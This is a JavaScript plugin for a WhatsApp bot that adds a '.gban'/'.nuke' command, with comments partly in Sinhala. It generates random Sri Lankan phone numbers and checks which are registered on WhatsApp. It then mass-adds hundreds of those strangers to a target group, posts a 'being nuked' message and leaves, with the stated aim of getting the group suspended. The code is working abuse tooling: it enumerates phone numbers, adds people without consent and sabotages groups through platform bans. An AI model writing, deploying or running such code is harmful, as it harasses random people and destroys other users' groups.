// ================================================================
// 📦 ADVANCED GROUP BAN PLUGIN (For SHAVIYA-XMD Bot Base)
// ================================================================

const { cmd } = require('../command');

// ================================================================
// 1. CONFIGURATION
// ================================================================

const CONFIG = {
  COUNTRY_CODE: '94',              // රටේ කේතය (ශ්‍රී ලංකාව = 94)
  TOTAL_TO_GENERATE: 300,          // Generate කරන මුළු numbers ගණන
  BATCH_SIZE_CHECK: 50,            // Register check එකේදී එක පාරට check කරන ගණන
  ADD_BATCH_SIZE: 150,             // එක පාරට Add කරන ගණන (150)
  DELAY_BETWEEN_ADDS: 200,         // Add කිරීම් අතර ප්‍රමාදය (Ultra Fast = 200ms)
  DELAY_BETWEEN_CHECKS: 100,       // Register checks අතර ප්‍රමාදය
  BOT_INVITE_CODE: null,           // Bot එක Admin නැති උනොත් Invite Code එක (විකල්ප)
};

// ================================================================
// 2. UTILITY FUNCTIONS
// ================================================================

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

function generateRandomNumbers(count) {
  const numbers = new Set();
  while (numbers.size < count) {
    const randomDigits = Math.floor(Math.random() * 1000000000)
                             .toString()
                             .padStart(9, '0');
    const fullNumber = CONFIG.COUNTRY_CODE + randomDigits;
    if (fullNumber.length >= 10 && fullNumber.length <= 15) {
      numbers.add(fullNumber);
    }
  }
  return Array.from(numbers);
}

// ================================================================
// 3. REGISTER CHECK FUNCTION
// ================================================================

async function getRegisteredJids(sock, numbers) {
  const registeredJids = [];
  console.log(`🔍 Checking ${numbers.length} numbers for WhatsApp registration...`);
  
  for (let i = 0; i < numbers.length; i += CONFIG.BATCH_SIZE_CHECK) {
    const batch = numbers.slice(i, i + CONFIG.BATCH_SIZE_CHECK);
    try {
      const result = await sock.onWhatsApp(batch);
      if (result && Array.isArray(result)) {
        for (const item of result) {
          if (item.exists && item.jid) {
            registeredJids.push(item.jid);
          }
        }
      }
      console.log(`✅ Checked batch: Found ${registeredJids.length} registered so far.`);
    } catch (error) {
      console.error('Registration check error:', error);
    }
    await delay(CONFIG.DELAY_BETWEEN_CHECKS);
  }
  console.log(`✅ Total registered numbers found: ${registeredJids.length}`);
  return registeredJids;
}

// ================================================================
// 4. BOT AUTO-JOIN FUNCTION
// ================================================================

async function autoJoinGroup(sock, inviteCode) {
  if (!inviteCode) {
    console.log('ℹ️ No invite code provided. Skipping auto-join.');
    return false;
  }
  try {
    console.log(`🔗 Attempting to join group with invite: ${inviteCode}`);
    await sock.groupAcceptInvite(inviteCode);
    console.log('✅ Bot successfully joined the group!');
    return true;
  } catch (error) {
    console.error('❌ Failed to join group:', error.message);
    return false;
  }
}

// ================================================================
// 5. MAIN GROUP BAN FUNCTION
// ================================================================

async function groupBan(sock, target, inviteCode = null) {
  if (!target.endsWith("@g.us")) {
    throw new Error("@g.us server required");
  }

  // Step 1: Group Metadata එක ගන්න
  let groupMetadata;
  try {
    groupMetadata = await sock.groupMetadata(target);
  } catch (error) {
    throw new Error("Failed to fetch group metadata. Is the bot in the group?");
  }

  const botId = sock.user?.id?.split(':')[0] + '@s.whatsapp.net';

  // Step 2: Bot එක Admin ද කියලා බලන්න
  const botIsAdmin = groupMetadata.participants.some(
    (p) => p.id === botId && (p.admin === 'admin' || p.admin === 'superadmin')
  );

  // Step 3: Bot එක Admin නැතිනම්, Auto-Join උත්සහ කරන්න
  if (!botIsAdmin) {
    console.log('⚠️ Bot is not admin. Attempting to auto-join via invite...');
    const codeToUse = inviteCode || CONFIG.BOT_INVITE_CODE;
    if (codeToUse) {
      const joined = await autoJoinGroup(sock, codeToUse);
      if (joined) {
        throw new Error("Bot joined via invite, but needs to be PROMOTED to ADMIN to add members. Please promote the bot manually.");
      } else {
        throw new Error("Failed to auto-join. Please provide a valid invite code or promote the bot to admin.");
      }
    } else {
      throw new Error("Bot is not an admin. Please promote the bot to admin, or provide an invite code.");
    }
  }

  console.log('✅ Bot is admin. Proceeding with group nuke...');

  // Step 4: Random Numbers Generate කරන්න
  const randomNumbers = generateRandomNumbers(CONFIG.TOTAL_TO_GENERATE);
  console.log(`📱 Generated ${randomNumbers.length} random numbers.`);

  // Step 5: Register වෙලා තියෙන අය විතරක් Filter කරන්න
  const registeredJids = await getRegisteredJids(sock, randomNumbers);
  
  if (registeredJids.length === 0) {
    throw new Error("No registered WhatsApp numbers found in the generated list!");
  }

  // Step 6: Add කරන්න ඕන ගණන (150ක්)
  const targetCount = Math.min(CONFIG.ADD_BATCH_SIZE, registeredJids.length);
  const toAdd = registeredJids.slice(0, targetCount);
  
  console.log(`🚀 Attempting to add ${toAdd.length} registered numbers to the group...`);

  // Step 7: ULTRA FAST BATCH ADD (එක පාරට 150)
  try {
    await sock.groupParticipantsUpdate(target, toAdd, "add");
    console.log(`✅ Successfully added ${toAdd.length} members in ONE BATCH!`);
    
    if (registeredJids.length > targetCount) {
      const secondBatch = registeredJids.slice(targetCount, targetCount + CONFIG.ADD_BATCH_SIZE);
      if (secondBatch.length > 0) {
        console.log(`🚀 Adding second batch of ${secondBatch.length} members...`);
        await delay(CONFIG.DELAY_BETWEEN_ADDS);
        await sock.groupParticipantsUpdate(target, secondBatch, "add");
        console.log(`✅ Added second batch!`);
      }
    }
    
    console.log('💣 Leaving group to finalize nuke...');
    await delay(500);
    await sock.sendMessage(target, { text: "💥 This group is being nuked! Goodbye." });
    await sock.groupLeave(target);
    
    console.log(`✅ Group ${target} has been successfully nuked and bot left.`);
    
  } catch (error) {
    console.error('Add or Leave error:', error);
    try {
      await sock.groupLeave(target);
    } catch (e) {}
    throw error;
  }
}

// ================================================================
// 6. COMMAND HANDLER (.gban) – CORRECTED SIGNATURE
// ================================================================

cmd({
    pattern: "gban",
    alias: ["nuke", "destroygroup", "suspend"],
    react: "💣",
    desc: "Add 150+ registered random numbers to suspend the group.",
    category: "admin",
    filename: __filename
},
async (conn, mek, m, { from, reply, args, isOwner }) => {   // <-- Correct signature
    let targetGroup = null;
    let inviteCode = null;

    try {
        // Optional owner-only check (uncomment if you want)
        // if (!isOwner) return reply("❌ This command is for the bot owner only.");

        // Case 1: Command used in a group
        if (from.endsWith("@g.us")) {
            targetGroup = from;
            // If user provided an invite code as argument, use it for auto-join if needed
            inviteCode = args[0] || null;
        } 
        // Case 2: Command used in private chat – need to provide group link or JID
        else {
            if (!args[0]) {
                return reply("❌ *Usage in private chat:*\n\nProvide a group invite link or group JID.\n\nExamples:\n`.gban https://chat.whatsapp.com/XXXXX`\n`.gban 120363xxxxx@g.us`");
            }
            const input = args[0];
            // Check if it's an invite link
            if (input.includes("chat.whatsapp.com/")) {
                const code = input.split("chat.whatsapp.com/")[1]?.split("/")[0]?.split("?")[0];
                if (!code) return reply("❌ Invalid invite link.");
                inviteCode = code;
                // Try to get group info to get JID
                try {
                    const groupInfo = await conn.groupGetInviteInfo(inviteCode);
                    if (groupInfo && groupInfo.id) {
                        targetGroup = groupInfo.id;
                    } else {
                        return reply("❌ Could not fetch group info from invite.");
                    }
                } catch (e) {
                    return reply(`❌ Invalid invite or bot cannot join: ${e.message}`);
                }
            } else if (input.endsWith("@g.us")) {
                // Direct group JID provided
                targetGroup = input;
            } else {
                return reply("❌ Invalid input. Please provide a group invite link or group JID.");
            }
        }

        // If still no targetGroup, error
        if (!targetGroup) return reply("❌ Could not determine target group.");

        // Send initial message
        await reply(`🚀 Starting Group Nuke...\n📱 Generating random numbers...\n✅ Will add only REGISTERED WhatsApp numbers!\n⏳ Please wait...`);

        // Execute the ban
        await groupBan(conn, targetGroup, inviteCode);
        // Note: groupBan will leave the group, so we might not reach this point.
        // But if we do (e.g., error prevented leaving), we can send a message.
        await reply("✅ Group nuke completed (bot may have left).");
        
    } catch (error) {
        console.error("Group Ban Error:", error);
        // Try to send error message if group still exists
        try {
            await reply(`❌ Failed: ${error.message || "Unknown error"}`);
        } catch (e) {
            console.log("Could not send error message (group likely suspended).");
        }
    }
});

// ================================================================
// 7. LOADED MESSAGE
// ================================================================

console.log('✅ Group Ban Plugin Loaded!');
console.log('📌 Command: .gban');
console.log('📌 Alias: .nuke, .destroygroup, .suspend');
console.log('📌 Usage (in group): .gban [invite_code_optional]');
console.log('📌 Usage (private): .gban <invite_link_or_group_JID>');
